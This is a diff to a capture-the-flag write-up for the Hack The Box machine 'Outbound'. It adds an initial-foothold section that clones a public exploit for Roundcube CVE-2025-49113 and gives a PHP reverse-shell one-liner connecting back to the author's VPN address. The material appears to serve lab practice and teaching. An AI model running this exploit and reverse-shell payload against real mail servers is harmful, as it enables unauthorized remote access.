@@ -81,8 +81,23 @@ sudo echo "10.10.11.17 outbound.htb mail.outbound.htb" > /etc/hosts
 |    ![[Outbound-02.png]]     |
 | :-------------------------: |
 | *Roundcube Webmail Version* |
-* After logging in there wasnt much to find but i got the version of Roundcube webmail.
+* After logging in there wasn't much to find but i got the version of Roundcube webmail.
 
 ### CVE-2025-49113
 * After checking the Version on the web, we found out that the Roundcube version 1.16.10 is vulnerable to PHP object deserialization flaw.[Reference](https://www.offsec.com/blog/cve-2025-49113/)
-* 
+* We also found a working exploit on [Github](https://github.com/fearsoff-org/CVE-2025-49113)
+## Initial Foothold
+Let's Clone the exploit repo and exploit the vulnerability.
+```bash
+git clone https://github.com/fearsoff-org/CVE-2025-49113
+cd CVE-2025-49113/
+```
+
+We can execute code on the remote machine so lets try getting a reverse shell, most of the payloads didn't work so i used this PHP payload.
+
+```bash
+php -r '\$s=fsockopen(\"$tun0\",4444);\$p=proc_open(\"/bin/sh\",[0=>\$s,1=>\$s,2=>\$s],\$pipes);'
+```
+Where $tun0 is my vpn ip and 4444 is the port i am listening on.
+
+I got a reverse shell on my pwncat shell
